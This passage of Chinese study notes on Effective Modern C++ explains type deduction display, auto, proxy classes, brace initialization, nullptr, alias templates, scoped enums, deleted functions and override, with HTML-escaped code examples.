typeid(x).name() &lt;&lt; '\\n'; //显示x和y的类型std::cout &lt;&lt; typeid(y).name() &lt;&lt; '\\n'; 这种方法对一个对象如x或y调用typeid产生一个std::type_info的对象，然后std::type_info里面的成员函数name()来产生一个C风格的字符串（即一个const char*）表示变量的名字。 调用std::type_info::name不保证返回任何有意义的东西，但是库的实现者尝试尽量使它们返回的结果有用。 举个例子，GNU和Clang环境下x的类型会显示为\"i\"，y会显示为\"PKi\"。\"i\"表示\"int\"，\"\"PK\"表示\"pointer to konst const\"（指向常量的指针）。 如果传递的是一个引用，那么引用部分（reference-ness）将被忽略，如果忽略后还具有const或者volatile，那么常量性constness或者易变性volatileness也会被忽略。 std::type_info::name的结果并不总是可信的，因为std::type_info::name规范批准像传值形参一样来对待这些类型。Boost TypeIndex库（Boost.TypeIndex）是更好的选择。 例如： 123456789101112131415161718#include &lt;boost/type_index.hpp&gt;template&lt;typename T&gt;void f(const T&amp; param)&#123; using std::cout; using boost::typeindex::type_id_with_cvr; //显示T cout &lt;&lt; \"T = \" &lt;&lt; type_id_with_cvr&lt;T&gt;().pretty_name() &lt;&lt; '\\n'; //显示param类型 cout &lt;&lt; \"param = \" &lt;&lt; type_id_with_cvr&lt;decltype(param)&gt;().pretty_name() &lt;&lt; '\\n';&#125; boost::typeindex::type_id_with_cvr获取一个类型实参（我们想获得相应信息的那个类型），它不消除实参的const，volatile和引用修饰符（因此模板名中有“with_cvr”）。结果是一个boost::typeindex::type_index对象，它的pretty_name成员函数输出一个std::string，包含我们能看懂的类型表示。 基于这个f的实现版本，再次考虑那个使用typeid时获取param类型信息出错的调用： 123456std::vetor&lt;Widget&gt; createVec(); //工厂函数const auto vw = createVec(); //使用工厂函数返回值初始化vwif (!vw.empty())&#123; f(&amp;vw[0]); //调用f …&#125; 在GNU和Clang的编译器环境下，使用Boost.TypeIndex版本的f最后会产生下面的（准确的）输出： 12T = Widget const *param = Widget const * const&amp; 在Microsoft的编译器环境下，结果也是极其相似： 12T = class Widget const *param = class Widget const * const &amp; 结论 类型推断可以使用IDE，使用编译器报错，使用Boost.TypeIndex库 这些工具可能既不准确也无帮助，所以理解C++类型推导规则才是最重要的 5 优先考虑auto而非显式类型声明 从程序员的角度来说，如果按照符合规定的流程走，那auto类型推导的一些结果是错误的。当这些情况发生时，引导auto产生正确的结果是很重要的。 auto变量从初始化表达式中推导出类型，所以我们必须初始化。 12345678910111213141516171819int x1; //潜在的未初始化的变量 auto x2; //错误！必须要初始化auto x3 = 0; //没问题，x已经定义了template&lt;typename It&gt; void dwim(It b,It e)&#123; while (b != e) &#123; auto currValue = *b; … &#125;&#125;auto derefUPLess = [](const std::unique_ptr&lt;Widget&gt; &amp;p1, //用于std::unique_ptr const std::unique_ptr&lt;Widget&gt; &amp;p2) //指向的Widget类型的 &#123; return *p1 &lt; *p2; &#125;; //比较函数 如果使用C++14，将会变得更酷，因为lambda表达式中的形参也可以使用auto： 1234567891011auto derefLess = //C++14版本 [](const auto&amp; p1, //被任何像指针一样的东西 const auto&amp; p2) //指向的值的比较函数 &#123; return *p1 &lt; *p2; &#125;;// 也即std::function&lt;bool(const std::unique_ptr&lt;Widget&gt; &amp;, const std::unique_ptr&lt;Widget&gt; &amp;)&gt;derefUPLess = [](const std::unique_ptr&lt;Widget&gt; &amp;p1, const std::unique_ptr&lt;Widget&gt; &amp;p2) &#123; return *p1 &lt; *p2; &#125;; 实例化std::function并声明一个对象这个对象将会有固定的大小。这个大小可能不足以存储一个闭包，这个时候std::function的构造函数将会在堆上面分配内存来存储，这就造成了使用std::function比auto声明变量会消耗更多的内存。 通过std::function调用一个闭包几乎无疑比auto声明的对象调用要慢。换句话说，std::function方法比auto方法要更耗空间且更慢，还可能有out-of-memory异常。并且正如上面的例子，比起写std::function实例化的类型来，使用auto要方便得多。 考虑以下问题： 123std::vector&lt;int&gt; v;…unsigned sz = v.size(); v.size()的标准返回类型是std::vector&lt;int&gt;::size_type，但是只有少数开发者意识到这点。std::vector&lt;int&gt;::size_type实际上被指定为无符号整型。上述的代码，会造成一些有趣的结果。 举个例子，在Windows 32-bit上std::vector&lt;int&gt;::size_type和unsigned是一样的大小，但是在Windows 64-bit上std::vector&lt;int&gt;::size_type是64位，unsigned是32位。这意味着这段代码在Windows 32-bit上正常工作，但是当把应用程序移植到Windows 64-bit上时就可能会出现一些问题。 所以使用auto可以确保你不需要浪费时间： 1auto sz =v.size(); //sz的类型是std::vector&lt;int&gt;::size_type 考虑下面的代码： 1234567std::unordered_map&lt;std::string, int&gt; m;…for(const std::pair&lt;std::string, int&gt;&amp; p : m)&#123; … //用p做一些事&#125; 看起来好像很合情合理的表达，但是这里有一个问题： std::unordered_map的key是const的，所以hash table中的std::pair的类型不是std::pair&lt;std::string, int&gt;，而是std::pair&lt;const std::string, int&gt;。 编译器会努力的找到一种方法把std::pair&lt;const std::string, int&gt;（即hash table中的东西）转换为std::pair&lt;std::string, int&gt;（p的声明类型）。它会成功的，因为它会通过拷贝m中的对象创建一个临时对象，是m中元素的类型。然后把p的引用绑定到这个临时对象上。在每个循环迭代结束时，临时对象将会销毁。 所以不只是让p指向m中各个元素的引用而已。 使用auto可以避免这些很难被意识到的类型不匹配的错误： 123for(const auto&amp; p : m) &#123; … //如之前一样&#125; 这样无疑更具效率，且更容易书写。而且，这个代码有一个非常吸引人的特性，如果你获取p的地址，你确实会得到一个指向m中元素的指针。在没有auto的版本中p会指向一个临时变量，这个临时变量在每次迭代完成时会被销毁。 讲究！ 有时候，显式的指定类型可能会导致你不想看到的类型转换。如果你使用auto声明目标变量你就不必担心这个问题。 然而auto也不是完美的。每个auto变量都从初始化表达式中推导类型，有一些表达式的类型和我们期望的大相径庭，比如在 理解auto类型推导 小结的内容。 另外，一个适当的变量名称就能体现大量的抽象类型信息，所以不用考虑 auto 带来的信息不可见性。 结论 auto变量必须初始化，通常它可以避免一些移植性和效率性的问题，也使得重构更方便，还能让你少打几个字。 注意 auto 可能出现一些类型推导不一致的问题。 6 auto 遇上代理类型，使用显式类型初始化 假如我有一个函数，参数为Widget，返回一个std::vector&lt;bool&gt;，这里的bool表示Widget是否提供一个独有的特性。 1std::vector&lt;bool&gt; features(const Widget&amp; w); 更进一步假设第5个bit表示Widget是否具有高优先级，我们可以写这样的代码： 12345Widget w;…bool highPriority = features(w)[5]; //w高优先级吗？…processWidget(w, highPriority); //根据它的优先级处理w 这个代码没有任何问题。它会正常工作，但是如果我们使用auto代替highPriority的显式指定类型做一些看起来很无害的改变： 1auto highPriority = features(w)[5]; //w高优先级吗？ 情况变了。所有代码仍然可编译，但是行为不再可预测： 1processWidget(w,highPriority); //未定义行为！ 因为 features(w)[5] 调用 operator[]不会返回容器中元素的引用，取而代之它返回一个std::vector&lt;bool&gt;::reference的对象。 调用features将返回一个std::vector&lt;bool&gt;临时对象，这个对象没有名字，为了方便我们的讨论，我这里叫他temp。operator[]在temp上调用，它返回的std::vector&lt;bool&gt;::reference包含一个指向存着这些 bits 的指针（temp管理这些bits）。highPriority是这个std::vector&lt;bool&gt;::reference的拷贝，所以highPriority也包含一个指针，指向temp中的管理 bits 。在这个语句结束的时候temp将会被销毁，因为它是一个临时变量。因此highPriority包含一个悬挂（dangling）指针，如果用于processWidget调用中将会造成未定义行为： 12processWidget(w, highPriority); //未定义行为！ //highPriority包含一个悬置指针！ 代理类问题 std::vector&lt;bool&gt;::reference是一个代理类（proxy class）的例子：所谓代理类就是以模仿和增强一些类型的行为为目的而存在的类。 C++标准模板库中的智能指针也是用代理类实现了对原始指针的资源管理行为。 一些代理类被设计于用以对客户可见。比如std::shared_ptr和std::unique_ptr。其他的代理类则或多或少不可见，比如std::vector&lt;bool&gt;::reference就是不可见代理类的一个例子，还有std::bitset::reference 等。 一些C++库也是用了表达式模板（expression templates）的黑科技。这些库通常被用于提高数值运算的效率。给出一个矩阵类Matrix和矩阵对象m1，m2，m3，m4，举个例子，这个表达式 1Matrix sum = m1 + m2 + m3 + m4; 可以使计算更加高效，只需要使让operator+返回一个代理类代理结果 Sum&lt;Matrix, Matrix&gt; 而不是返回结果本身。 作为一个通则，不可见的代理类通常不适用于auto。这样类型的对象的生命期通常不会活过一条语句，所以创建那样的对象是危险的。 显式类型初始化器（the explicitly typed initialized idiom) 1auto highPriority = static_cast&lt;bool&gt;(features(w)[5]); 这里，features(w)[5]还是返回一个std::vector&lt;bool&gt;::reference对象，但是这个转型使得表达式类型为bool，然后auto才被用于推导highPriority。 12auto sum = static_cast&lt;Matrix&gt;(m1 + m2 + m3 + m4);auto ep = static_cast&lt;float&gt;(calcEpsilon()); // 转换精度 结论 不可见的代理类可能会使auto从表达式中推导出“错误的”类型 显式类型初始化器强制auto推导出你想要的结果 7 区分()和{}创建对象 C++11使用统一初始化（uniform initialization） 1std::vector&lt;int&gt; v&#123; 1, 3, 5 &#125;; //v初始内容为1,3,5 C++11允许\"=\"初始化不加花括号也拥有这种能力，括号初始化也能被用于为非静态数据成员指定默认初始值： 12345678class Widget&#123; …private: int x&#123; 0 &#125;; //没问题，x初始值为0 int y = 0; //也可以 int z(0); //错误！&#125; 另一方面，不可拷贝的对象（例如std::atomic）可以使用花括号初始化或者圆括号初始化，但是不能使用\"=\"初始化： 123std::atomic&lt;int&gt; ai1&#123; 0 &#125;; //没问题std::atomic&lt;int&gt; ai2(0); //没问题std::atomic&lt;int&gt; ai3 = 0; //错误！ 内置类型间的隐式变窄转换 (narrowing conversion) 括号表达式还有一个少见的特性，即它不允许内置类型间隐式的变窄转换（narrowing conversion）。如果一个使用了括号初始化的表达式的值，不能保证由被初始化的对象的类型来表示，代码就不会通过编译： 123double x, y, z;int sum1&#123; x + y + z &#125;; //错误！double的和可能不能表示为int 使用圆括号和\"=\"的初始化不检查是否转换为变窄转换，因为由于历史遗留问题它们必须要兼容老旧代码： 123int sum2(x + y +z); //可以（表达式的值被截为int）int sum3 = x + y + z; //同上 被误认为是声明 C++规定任何可以被解析为一个声明的东西必须被解析为声明。 1Widget w1(10); //使用实参10调用Widget的一个构造函数 但是如果你尝试使用相似的语法调用Widget无参构造函数，它就会变成函数声明： 1Widget w2(); //最令人头疼的解析！声明一个函数w2，返回Widget 由于函数声明中形参列表不能带花括号，所以使用花括号初始化表明你想调用默认构造函数构造对象就没有问题： 1Widget w3&#123;&#125;; //调用没有参数的构造函数构造对象 initializer_list关联问题 在构造函数调用中，只要不包含std::initializer_list形参，那么花括号初始化和圆括号初始化都会产生一样的结果： 12345678910class Widget &#123; public: Widget(int i, bool b); //构造函数未声明 Widget(int i, double d); //std::initializer_list这个形参 …&#125;;Widget w1(10, true); //调用第一个构造函数Widget w2&#123;10, true&#125;; //也调用第一个构造函数Widget w3(10, 5.0); //调用第二个构造函数Widget w4&#123;10, 5.0&#125;; //也调用第二个构造函数 然而，如果有一个或者多个构造函数的声明包含一个std::initializer_list形参，那么使用括号初始化语法的调用更倾向于选择带std::initializer_list的那个构造函数。 1234567class Widget &#123; public: Widget(int i, bool b); //同上 Widget(int i, double d); //同上 Widget(std::initializer_list&lt;long double&gt; il); //新添加的 …&#125;; w2和w4将会使用新添加的构造函数，即使另一个非std::initializer_list构造函数和实参更匹配： 12345678910111213Widget w1(10, true); //使用圆括号初始化，同之前一样 //调用第一个构造函数Widget w2&#123;10, true&#125;; //使用花括号初始化，但是现在 //调用带std::initializer_list的构造函数 //(10 和 true 转化为long double)Widget w3(10, 5.0); //使用圆括号初始化，同之前一样 //调用第二个构造函数 Widget w4&#123;10, 5.0&#125;; //使用花括号初始化，但是现在 //调用带std::initializer_list的构造函数 //(10 和 5.0 转化为long double) 编译器一遇到括号初始化就选择带std::initializer_list的构造函数的决心是如此强烈，以至于就算带std::initializer_list的构造函数不能被调用，它也会硬选。 123456789class Widget &#123; public: Widget(int i, bool b); //同之前一样 Widget(int i, double d); //同之前一样 Widget(std::initializer_list&lt;bool&gt; il); //现在元素类型为bool … //没有隐式转换函数&#125;;Widget w&#123;10, 5.0&#125;; //错误！要求变窄转换 这里，编译器会直接忽略前面两个构造函数（其中第二个构造函数是所有实参类型的最佳匹配），然后尝试调用std::initializer_list&lt;bool&gt;构造函数。调用这个函数将会把int(10)和double(5.0)转换为bool，由于会产生变窄转换（bool不能准确表示其中任何一个值），括号初始化拒绝变窄转换，所以这个调用无效，代码无法通过编译。 只有当没办法把括号初始化中实参的类型转化为std::initializer_list时，编译器才会回到正常的函数决议流程中。 12345678910111213class Widget &#123; public: Widget(int i, bool b); //同之前一样 Widget(int i, double d); //同之前一样 //现在std::initializer_list元素类型为std::string Widget(std::initializer_list&lt;std::string&gt; il); … //没有隐式转换函数&#125;;Widget w1(10, true); // 使用圆括号初始化，调用第一个构造函数Widget w2&#123;10, true&#125;; // 使用花括号初始化，现在调用第一个构造函数Widget w3(10, 5.0); // 使用圆括号初始化，调用第二个构造函数Widget w4&#123;10, 5.0&#125;; // 使用花括号初始化，现在调用第二个构造函数 空的花括号意味着没有实参，不是一个空的std::initializer_list： 1234567891011class Widget &#123; public: Widget(); //默认构造函数 Widget(std::initializer_list&lt;int&gt; il); //std::initializer_list构造函数 … //没有隐式转换函数&#125;;Widget w1; //调用默认构造函数Widget w2&#123;&#125;; //也调用默认构造函数Widget w3(); //最令人头疼的解析！声明一个函数 12Widget w4(&#123;&#125;); //使用空花括号列表调用std::initializer_list构造函数Widget w5&#123;&#123;&#125;&#125;; //同上 作为一个类库使用者，你必须认真的在花括号和圆括号之间选择一个来创建对象。大多数开发者都使用其中一种作为默认情况，只有当他们不能使用这种的时候才会考虑另一种。 结论 花括号初始化是最广泛使用的初始化语法，它防止变窄转换，并且对于C++最令人头疼的解析（括号解析为函数）有天生的免疫性 在构造函数重载决议中，编译器会尽最大努力将括号初始化与std::initializer_list参数匹配，即便其他构造函数看起来是更好的选择 对于数值类型的std::vector来说使用花括号初始化和圆括号初始化会造成巨大的不同 在模板类选择使用圆括号初始化或使用花括号初始化创建对象是需要仔细考虑 8 优先 nullptr 在C++98中，对指针类型和整型进行重载意味着可能导致奇怪的事情。如果给下面的重载函数传递0或NULL，它们绝不会调用指针版本的重载函数： 12345678void f(int); //三个f的重载函数void f(bool);void f(void*);f(0); //调用f(int)而不是f(void*)f(NULL); //可能不会被编译，一般来说调用f(int)， //绝对不会调用f(void*) 而f(NULL)的不确定行为是由NULL的实现不同造成的。如果NULL被定义为0L（指的是0为long类型），这个调用就具有二义性，因为从long到int的转换或从long到bool的转换或0L到void*的转换都同样好。 nullptr的优点是它不是整型。它也不是一个指针类型，但是你可以把它认为是所有类型的指针。nullptr的真正类型是std::nullptr_t，在一个完美的循环定义以后，std::nullptr_t又被定义为nullptr。std::nullptr_t可以隐式转换为指向任何内置类型的指针。 使用nullptr调用f将会调用void*版本的重载函数，因为nullptr不能被视作任何整型： 1f(nullptr); //调用重载函数f的f(void*)版本 看下面的例子： 1234auto result = findRecord( /* arguments */ );if (result == 0) &#123; …&#125; 如果你不知道findRecord返回了什么，那么你就不太清楚到底result是一个指针类型还是一个整型。但是换一种假设如果你看到这样的代码： 12345auto result = findRecord( /* arguments */ );if (result == nullptr) &#123; …&#125; 这就没有任何歧义：result的结果一定是指针类型。 再考虑下面例子： 假如你有一些函数只能被合适的已锁互斥量调用。每个函数都有一个不同类型的指针： 123int f1(std::shared_ptr&lt;Widget&gt; spw); //只能被合适的double f2(std::unique_ptr&lt;Widget&gt; upw); //已锁互斥量bool f3(Widget* pw); //调用 如果这样传递空指针： 12345678910111213141516171819std::mutex f1m, f2m, f3m; //用于f1，f2，f3函数的互斥量using MuxGuard = std::lock_guard&lt;std::mutex&gt;;…&#123; MuxGuard g(f1m); //为f1m上锁 auto result = f1(0); //向f1传递0作为空指针&#125; //解锁 …&#123; MuxGuard g(f2m); //为f2m上锁 auto result = f2(NULL); //向f2传递NULL作为空指针&#125; //解锁 …&#123; MuxGuard g(f3m); //为f3m上锁 auto result = f3(nullptr); //向f3传递nullptr作为空指针&#125; //解锁 令人遗憾前两个调用没有使用nullptr，但是代码可以正常运行。 模板化这个调用流程： 12345678910template&lt;typename FuncType, typename MuxType, typename PtrType&gt;auto lockAndCall(FuncType func, MuxType&amp; mutex, PtrType ptr) -&gt; decltype(func(ptr))&#123; MuxGuard g(mutex); return func(ptr); &#125; 12345678910template&lt;typename FuncType, typename MuxType, typename PtrType&gt;decltype(auto) lockAndCall(FuncType func, //C++14 MuxType&amp; mutex, PtrType ptr)&#123; MuxGuard g(mutex); return func(ptr); &#125; 可以写这样的代码调用lockAndCall模板： 12345auto result1 = lockAndCall(f1, f1m, 0); //错误！...auto result2 = lockAndCall(f2, f2m, NULL); //错误！...auto result3 = lockAndCall(f3, f3m, nullptr); //没问题 代码虽然可以这样写，但是就像注释中说的，前两个情况不能通过编译。 当0被传递给lockAndCall模板，模板类型推导会尝试去推导实参类型，0的类型总是int。 这意味着lockAndCall中func会被int类型的实参调用，这与f1期待的std::shared_ptr&lt;Widget&gt;形参不符。把int类型看做std::shared_ptr&lt;Widget&gt;类型给f1自然是一个类型错误。在模板lockAndCall中使用0之所以失败是因为在模板中，传给的是int但实际上函数期待的是一个std::shared_ptr&lt;Widget&gt;。 当nullptr传给lockAndCall时，ptr被推导为std::nullptr_t。当ptr被传递给f3的时候，隐式转换使std::nullptr_t转换为Widget*，因为std::nullptr_t可以隐式转换为任何指针类型。 结论 优先考虑 nullptr 避免重载指针和整型 9 优先 alias 而不是 typedef typedef即可： 123typedef std::unique_ptr&lt;std::unordered_map&lt;std::string, std::string&gt;&gt; UPtrMapSS; 但typedef是C++98的东西。 C++11也提供了一个别名声明（alias declaration）： 12using UPtrMapSS = std::unique_ptr&lt;std::unordered_map&lt;std::string, std::string&gt;&gt;; 由于这里给出的typedef和别名声明做的都是完全一样的事情。 使用别名模板，会容易很多： 12345template&lt;typename T&gt; //MyAllocList&lt;T&gt;是using MyAllocList = std::list&lt;T, MyAlloc&lt;T&gt;&gt;; //std::list&lt;T, MyAlloc&lt;T&gt;&gt; //的同义词MyAllocList&lt;Widget&gt; lw; //用户代码 使用typedef，你就只能从头开始： 123456template&lt;typename T&gt; //MyAllocList&lt;T&gt;是struct MyAllocList &#123; //std::list&lt;T, MyAlloc&lt;T&gt;&gt; typedef std::list&lt;T, MyAlloc&lt;T&gt;&gt; type; //的同义词 &#125;;MyAllocList&lt;Widget&gt;::type lw; //用户代码 如果你想使用在一个模板内使用typedef声明一个链表对象，而这个对象又使用了模板形参，你就不得不在typedef前面加上typename： 123456template&lt;typename T&gt;class Widget &#123; //Widget&lt;T&gt;含有一个private: //MyAllocLIst&lt;T&gt;对象 typename MyAllocList&lt;T&gt;::type list; //作为数据成员 …&#125;; 这里MyAllocList&lt;T&gt;::type使用了一个类型，这个类型依赖于模板参数T。 如果使用别名声明定义一个MyAllocList，就不需要使用typename（同时省略麻烦的“::type”后缀）： 123456789template&lt;typename T&gt; using MyAllocList = std::list&lt;T, MyAlloc&lt;T&gt;&gt;; //同之前一样template&lt;typename T&gt;class Widget &#123;private: MyAllocList&lt;T&gt; list; //没有“typename” … //没有“::type”&#125;; C++11在type traits（类型特性）中给了你一系列工具去实现类型转换，如果要使用这些模板请包含头文件&lt;type_traits&gt;。里面有许许多多type traits，也不全是类型转换的工具，也包含一些可预测接口的工具。给一个你想施加转换的类型T，结果类型就是std::transformation&lt;T&gt;::type，比如： 123std::remove_const&lt;T&gt;::type //从const T中产出Tstd::remove_reference&lt;T&gt;::type //从T&amp;和T&amp;&amp;中产出Tstd::add_lvalue_reference&lt;T&gt;::type //从T中产出T&amp; 注释仅仅简单的总结了类型转换做了什么，所以不要太随便的使用。在你的项目使用它们之前，你最好看看它们的详细说明书。 这些别名声明有一个通用形式：对于C++11的类型转换std::transformation&lt;T&gt;::type在C++14中变成了std::transformation_t。举个例子或许更容易理解： 12345678std::remove_const&lt;T&gt;::type //C++11: const T → T std::remove_const_t&lt;T&gt; //C++14 等价形式std::remove_reference&lt;T&gt;::type //C++11: T&amp;/T&amp;&amp; → T std::remove_reference_t&lt;T&gt; //C++14 等价形式std::add_lvalue_reference&lt;T&gt;::type //C++11: T → T&amp; std::add_lvalue_reference_t&lt;T&gt; //C++14 等价形式 C++11的的形式在C++14中也有效。其简单实现形式是： 123456789template &lt;class T&gt; using remove_const_t = typename remove_const&lt;T&gt;::type;template &lt;class T&gt; using remove_reference_t = typename remove_reference&lt;T&gt;::type;template &lt;class T&gt; using add_lvalue_reference_t = typename add_lvalue_reference&lt;T&gt;::type; 结论 typedef不支持模板化，但是别名声明支持。 别名模板避免了使用“::type”后缀，而且在模板中使用typedef还需要在前面加上typename C++14提供了C++11所有type traits转换的别名声明版本 10 限域`enum 12345678enum class Color &#123; black, white, red &#125;; //black, white, red //限制在Color域内auto white = false; //没问题，域内没有其他“white”Color c = white; //错误，域中没有枚举名叫whiteColor c = Color::white; //没问题auto c = Color::white; //也没问题（也符合Item5的建议） 因为限域enum是通过“enum class”声明，所以它们有时候也被称为枚举类(enum classes)。 使用限域enum来减少命名空间污染，这是一个足够合理使用它而不是它的同胞未限域enum的理由。 其实限域enum还有第二个吸引人的优点：在它的作用域中，枚举名是强类型。未限域enum中的枚举名会隐式转换为整型（现在，也可以转换为浮点类型）。因此下面这种歪曲语义的做法也是完全有效的： 12345678910111213enum Color &#123; black, white, red &#125;; //未限域enumstd::vector&lt;std::size_t&gt; //func返回x的质因子 primeFactors(std::size_t x);Color c = red;…if (c &lt; 14.5) &#123; // Color与double比较 (!) auto factors = // 计算一个Color的质因子(!) primeFactors(c); …&#125; 在enum后面写一个class就可以将非限域enum转换为限域enum，接下来就是完全不同的故事展开了。现在不存在任何隐式转换可以将限域enum中的枚举名转化为任何其他类型： 12345678910111213enum class Color &#123; black, white, red &#125;; //Color现在是限域enumColor c = Color::red; //和之前一样，只是... //多了一个域修饰符if (c &lt; 14.5) &#123; //错误！不能比较 //Color和double auto factors = //错误！不能向参数为std::size_t primeFactors(c); //的函数传递Color参数 …&#125;// 除非 static_cast&lt;double&gt;(c) 在C++中所有的enum都有一个由编译器决定的整型的底层类型。对于非限域enum比如Color， 1enum Color &#123; black, white, red &#125;; 编译器可能选择char作为底层类型，因为这里只需要表示三个值。然而，有些enum中的枚举值范围可能会大些，比如： 123456enum Status &#123; good = 0, failed = 1, incomplete = 100, corrupt = 200, indeterminate = 0xFFFFFFFF &#125;; 这里值的范围从0到0xFFFFFFFF。除了在不寻常的机器上（比如一个char至少有32bits的那种），编译器都会选择一个比char大的整型类型来表示Status。 为了高效使用内存，编译器通常在确保能包含所有枚举值的前提下为enum选择一个最小的底层类型。 为此，C++98只支持enum定义（所有枚举名全部列出来）；enum声明是不被允许的。编译器才能在使用之前为每一个enum选择一个底层类型。 不能前置声明enum也是有缺点的。最大的缺点莫过于它可能增加编译依赖。系统中某个枚举类型的头文件包含在多个文件中。如果引入一个新状态值，那么可能整个系统都得重新编译。 C++11中的前置声明enums可以解决这个问题。 12enum class Status; //前置声明void continueProcessing(Status s); //使用前置声明enum 即使Status的定义发生改变，包含这些声明的头文件也不需要重新编译。 默认情况下，限域枚举的底层类型是int： 1enum class Status; //底层类型是int 如果默认的int不适用，你可以重写它： 123enum class Status: std::uint32_t; //Status的底层类型 //是std::uint32_t //（需要包含 &lt;cstdint&gt;） 不管怎样，编译器都知道限域enum中的枚举名占用多少字节。 要为非限域enum指定底层类型，你可以同上，结果就可以前向声明： 123enum Color: std::uint8_t; //非限域enum前向声明 //底层类型为 //std::uint8_t 底层类型说明也可以放到enum定义处： 1234567enum class Status: std::uint32_t &#123; good = 0, failed = 1, incomplete = 100, corrupt = 200, audited = 500, indeterminate = 0xFFFFFFFF &#125;; 假设我们有一个tuple保存了用户的名字，email地址，声望值： 1234using UserInfo = //类型别名，参见Item9 std::tuple&lt;std::string, //名字 std::string, //email地址 std::size_t&gt; ; //声望 虽然注释说明了tuple各个字段对应的意思，但当你在另一文件遇到下面的代码那之前的注释就不是那么有用了： 123UserInfo uInfo; //tuple对象…auto val = std::get&lt;1&gt;(uInfo); //获取第一个字段 在 get 时，显示写明1随代表的字段。 用非限域enum将名字和字段编号关联起来以避免上述需求： 12345enum UserInfoFields &#123; uiName, uiEmail, uiReputation &#125;;UserInfo uInfo; //同之前一样…auto val = std::get&lt;uiEmail&gt;(uInfo); //啊，获取用户email字段的值 之所以它能正常工作是因为UserInfoFields中的枚举名隐式转换成std::size_t。 对应的限域enum版本就很啰嗦了： 1234567enum class UserInfoFields &#123; uiName, uiEmail, uiReputation &#125;;UserInfo uInfo; //同之前一样…auto val = std::get&lt;static_cast&lt;std::size_t&gt;(UserInfoFields::uiEmail)&gt; (uInfo); 为避免这种冗长的表示，我们可以写一个函数传入枚举名并返回对应的std::size_t值，但这有一点技巧性。 将枚举名变换为std::size_t值的函数必须在编译期产生这个结果。 它该是一个constexpr函数模板，因为它应该能用于任何enum。 底层类型可以通过std::underlying_type这个type trait获得。 12345678template&lt;typename E&gt;constexpr typename std::underlying_type&lt;E&gt;::type toUType(E enumerator) noexcept&#123; return static_cast&lt;typename std::underlying_type&lt;E&gt;::type&gt;(enumerator);&#125; 在C++14中，toUType还可以进一步用std::underlying_type_t代替typename std::underlying_type&lt;E&gt;::type打磨： 123456template&lt;typename E&gt; //C++14constexpr std::underlying_type_t&lt;E&gt; toUType(E enumerator) noexcept&#123; return static_cast&lt;std::underlying_type_t&lt;E&gt;&gt;(enumerator);&#125; 还可以再用C++14 auto打磨一下代码： 123456template&lt;typename E&gt; //C++14constexpr auto toUType(E enumerator) noexcept&#123; return static_cast&lt;std::underlying_type_t&lt;E&gt;&gt;(enumerator);&#125; 不管它怎么写，toUType现在允许这样访问tuple的字段了： 1auto val = std::get&lt;toUType(UserInfoFields::uiEmail)&gt;(uInfo); 结论 限域enum的枚举名仅在enum内可见。要转换为其它类型只能使用cast。 非限域/限域enum都支持底层类型说明语法，限域enum底层类型默认是int。非限域enum没有默认底层类型。 限域enum总是可以前置声明。非限域enum仅当指定它们的底层类型时才能前置。 11 使用 delete 而不是私有化其声明 123456789template &lt;class charT, class traits = char_traits&lt;charT&gt; &gt;class basic_ios : public ios_base &#123;public: … basic_ios(const basic_ios&amp; ) = delete; basic_ios&amp; operator=(const basic_ios&amp;) = delete; …&#125;; deleted函数不能以任何方式被调用，即使你在成员函数或者友元函数里面调用deleted函数也不能通过编译。这是较之C++98行为的一个改进，C++98中不正确的使用这些函数在链接时才被诊断出来。 通常，deleted函数被声明为public而不是private。这也是有原因的。当客户端代码试图调用成员函数，C++会在检查deleted状态前检查它的访问性。当客户端代码调用一个私有的deleted函数，一些编译器只会给出该函数是private的错误。 deleted函数还有一个重要的优势是任何函数都可以标记为deleted，而只有成员函数可被标记为private。 1234bool isLucky(int number); //原始版本bool isLucky(char) = delete; //拒绝charbool isLucky(bool) = delete; //拒绝boolbool isLucky(double) = delete; //拒绝float和double 另一个deleted函数用武之地（private成员函数做不到的地方）是禁止一些模板的实例化。假如你要求一个模板仅支持原生指针: 1234567891011121314template&lt;typename T&gt;void processPointer(T* ptr);template&lt;&gt;void processPointer&lt;void&gt;(void*) = delete;template&lt;&gt;void processPointer&lt;char&gt;(char*) = delete;template&lt;&gt;void processPointer&lt;const void&gt;(const void*) = delete;template&lt;&gt;void processPointer&lt;const char&gt;(const char*) = delete; 如果你想做得更彻底一些，你还要删除const volatile void*和const volatile char*重载版本，另外还需要一并删除其他标准字符类型的重载版本：std::wchar_t，std::char16_t和std::char32_t。 类模板在命名空间作用域中，删除特定实例化（private 是做不到的）： 123456789101112class Widget &#123;public: … template&lt;typename T&gt; void processPointer(T* ptr) &#123; … &#125; …&#125;;template&lt;&gt; //还是public，void Widget::processPointer&lt;void&gt;(void*) = delete; //但是已经被删除了 结论 使用delete函数更好 任何函数都能 delete，包括非成员函数和模板实例 12 使用override声明重写函数 派生类的虚函数重写基类同名函数，很可能一不小心就错了。 1234567891011121314151617181920class Base &#123;public: virtual void doWork(); //基类虚函数 …&#125;;class Derived: public Base &#123;public: virtual void doWork(); //重写Base::doWork … //（这里“virtual”是可以省略的）&#125;; std::unique_ptr&lt;Base&gt; upb = //创建基类指针指向派生类对象 std::make_unique&lt;Derived&gt;(); //关于std::make_unique… //请参见Item21 upb-&gt;doWork(); //通过基类指针调用doWork， //实际上是派生类的doWork //函数被调用 要想重写一个函数，必须满足下列要求： 基类函数必须是virtual 基类和派生类函数名必须完全一样（除非是析构函数) 基类和派生类函数形参类型必须完全一样 基类和派生类函数常量性constness必须完全一样 基类和派生类函数的返回值和异常说明（exception specifications）必须兼容 除了这些C++98就存在的约束外，C++11又添加了一个： 函数的引用限定符（reference qualifiers）必须完全一样。它可以限定成员函数只能用于左值或者右值： 1234567891011121314class Widget &#123;public: … void doWork() &amp;; //只有*this为左值的时候才能被调用 void doWork() &amp;&amp;; //只有*this为右值的时候才能被调用&#125;; …Widget makeWidget(); //工厂函数（返回右值）Widget w; //普通对象（左值）…w.doWork(); //调用被左值引用限定修饰的Widget::doWork版本 //（即Widget::doWork &amp;）makeWidget().doWork(); //调用被右值引用限定修饰的Widget::doWork版本 //（即Widget::doWork &amp;&amp;） 对于下面的例子： 1234567class Base &#123;public: virtual void mf1() const; virtual void mf2(int x); virtual void mf3() &amp;; void mf4() const;&#125;; C++11提供一个方法让你可以显式地指定一个派生类函数是基类版本的重写：将它声明为override。还是上面那个例子，我们可以这样做： 1234567class Derived: public Base &#123;public: virtual void mf1() override; virtual void mf2(unsigned int x) override; virtual void mf3() &amp;&amp; override; virtual void mf4() const override;&#125;; 代码不能编译，当然了，因为这样写的时候，编译器会显示所有与重写有关的问题。这也是你想要的，以及为什么要在所有重写函数后面加上override。 没有override，你只能寄希望于完善的单元测试。 C++11引入了两个上下文关键字（contextual 